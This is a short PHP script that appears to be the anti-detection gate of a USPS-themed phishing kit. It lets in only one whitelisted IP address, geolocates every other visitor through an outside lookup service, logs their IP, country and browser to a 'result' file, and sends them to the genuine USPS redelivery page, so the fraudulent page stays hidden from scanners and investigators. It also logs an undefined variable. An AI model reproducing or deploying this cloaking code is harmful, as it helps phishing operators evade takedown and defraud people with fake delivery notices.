<?php
$ini_array = parse_ini_file("setting.ini");

$IP = strval($ini_array['WhitelistedIp']);

function ipp(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ipssss = ipp();
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ipssss));
$country = $ipdat->geoplugin_countryCode;
if ($IP != $ipssss){
    $os = $_SERVER['HTTP_USER_AGENT'];
    $countryy = $ipdat->geoplugin_countryName;
    $click = fopen("./result/total_Blocked.txt","a");
    fwrite($click,"$ip|$country|$os"."\n");
    fclose($click);
    header("Location: https://tools.usps.com/redelivery.htm");
    exit();
}

?>